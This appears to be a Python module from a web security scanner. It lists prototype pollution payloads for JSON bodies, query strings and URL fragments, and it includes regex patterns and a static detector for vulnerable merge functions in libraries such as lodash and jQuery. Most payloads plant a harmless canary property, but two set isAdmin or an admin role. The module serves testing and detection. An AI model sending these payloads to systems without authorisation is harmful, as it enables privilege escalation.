"""
Prototype pollution payload corpus — ppmap / PortSwigger / Client-Side PP class.

Vectors:
  - JSON body __proto__ / constructor.prototype
  - Query-string dot & bracket notation
  - URL fragment / hash
  - Nested merge gadgets (lodash, jQuery, deepmerge patterns)
"""

from __future__ import annotations

import json
from typing import Any

# Canary property used across probes
CANARY = "psec_polluted"
CANARY_VAL = "1"

# JSON / body payloads
_JSON_PAYLOADS: list[dict[str, Any]] = [
    {"id": "json-proto", "vector": {CANARY: CANARY_VAL}, "wrap": "__proto__", "content_type": "application/json"},
    {"id": "json-constructor", "vector": {"prototype": {CANARY: CANARY_VAL}}, "wrap": "constructor", "content_type": "application/json"},
    {"id": "json-nested-proto", "vector": {"__proto__": {CANARY: CANARY_VAL}}, "wrap": None, "content_type": "application/json"},
    {"id": "json-nested-ctor", "vector": {"constructor": {"prototype": {CANARY: CANARY_VAL}}}, "wrap": None, "content_type": "application/json"},
    {"id": "json-proto-admin", "vector": {"__proto__": {"isAdmin": True, CANARY: CANARY_VAL}}, "wrap": None, "content_type": "application/json"},
    {"id": "json-proto-role", "vector": {"__proto__": {"role": "admin", CANARY: CANARY_VAL}}, "wrap": None, "content_type": "application/json"},
]

# Query-string style (key=value forms that frameworks parse into objects)
_QUERY_PAYLOADS: list[dict[str, Any]] = [
    {"id": "q-dot-proto", "key": f"__proto__.{CANARY}", "value": CANARY_VAL},
    {"id": "q-dot-ctor", "key": f"constructor.prototype.{CANARY}", "value": CANARY_VAL},
    {"id": "q-bracket-proto", "key": f"__proto__[{CANARY}]", "value": CANARY_VAL},
    {"id": "q-bracket-ctor", "key": f"constructor[prototype][{CANARY}]", "value": CANARY_VAL},
    {"id": "q-encoded-proto", "key": f"%5f%5fproto%5f%5f.{CANARY}", "value": CANARY_VAL},
    {"id": "q-proto-json", "key": "__proto__", "value": json.dumps({CANARY: CANARY_VAL})},
]

# Hash / fragment vectors (client-side routers)
_HASH_PAYLOADS: list[dict[str, Any]] = [
    {"id": "hash-proto", "fragment": f"__proto__[{CANARY}]={CANARY_VAL}"},
    {"id": "hash-ctor", "fragment": f"constructor[prototype][{CANARY}]={CANARY_VAL}"},
    {"id": "hash-json", "fragment": json.dumps({"__proto__": {CANARY: CANARY_VAL}})},
]

# Library-specific gadget hints (for offline detection)
_SINK_PATTERNS = [
    ("lodash.merge", r"(?i)_\.merge\s*\(|lodash\.merge"),
    ("lodash.defaultsDeep", r"(?i)defaultsDeep\s*\("),
    ("lodash.set", r"(?i)_\.set\s*\(|lodash\.set"),
    ("jquery.extend", r"(?i)\$\.extend\s*\(|jQuery\.extend"),
    ("jquery.param", r"(?i)\$\.param\s*\("),
    ("Object.assign", r"Object\.assign\s*\("),
    ("deepmerge", r"(?i)deepmerge\s*\("),
    ("deep-extend", r"(?i)deepExtend|deep-extend"),
    ("merge-deep", r"(?i)mergeDeep|merge-deep"),
    ("hoek", r"(?i)Hoek\.merge|@hapi/hoek"),
    ("node-extend", r"(?i)require\(['\"]extend['\"]\)"),
    ("JSON.parse-merge", r"JSON\.parse\s*\([^)]+\)[\s\S]{0,80}(merge|extend|assign)"),
    ("querystring.parse", r"(?i)qs\.parse|querystring\.parse"),
    ("minimist", r"(?i)minimist\s*\("),
]


def render_json(payload: dict[str, Any]) -> str:
    vec = payload["vector"]
    wrap = payload.get("wrap")
    if wrap == "__proto__":
        obj = {"__proto__": vec}
    elif wrap == "constructor":
        obj = {"constructor": vec}
    else:
        obj = vec
    return json.dumps(obj, separators=(",", ":"))


def list_payloads(kind: str = "all") -> dict[str, Any]:
    kind = (kind or "all").lower()
    out: dict[str, Any] = {"canary": CANARY, "canary_value": CANARY_VAL}
    if kind in ("all", "json"):
        out["json"] = [
            {**p, "body": render_json(p)} for p in _JSON_PAYLOADS
        ]
    if kind in ("all", "query"):
        out["query"] = list(_QUERY_PAYLOADS)
    if kind in ("all", "hash"):
        out["hash"] = list(_HASH_PAYLOADS)
    out["sink_patterns"] = [name for name, _ in _SINK_PATTERNS]
    out["total"] = sum(len(out.get(k, [])) for k in ("json", "query", "hash"))
    return out


def detect_in_text(text: str) -> dict[str, Any]:
    """Static detection of PP sources/sinks in JS/HTML/source."""
    import re
    hits = []
    for name, pat in _SINK_PATTERNS:
        if re.search(pat, text or ""):
            hits.append({"sink": name, "pattern": pat})
    proto_refs = len(re.findall(r"__proto__", text or ""))
    ctor_refs = len(re.findall(r"constructor\.prototype", text or ""))
    risk = "info"
    if hits and (proto_refs or ctor_refs):
        risk = "high"
    elif hits:
        risk = "medium"
    elif proto_refs or ctor_refs:
        risk = "low"
    return {
        "sinks": hits,
        "proto_refs": proto_refs,
        "constructor_prototype_refs": ctor_refs,
        "risk": risk,
        "engine": "pp-static",
    }
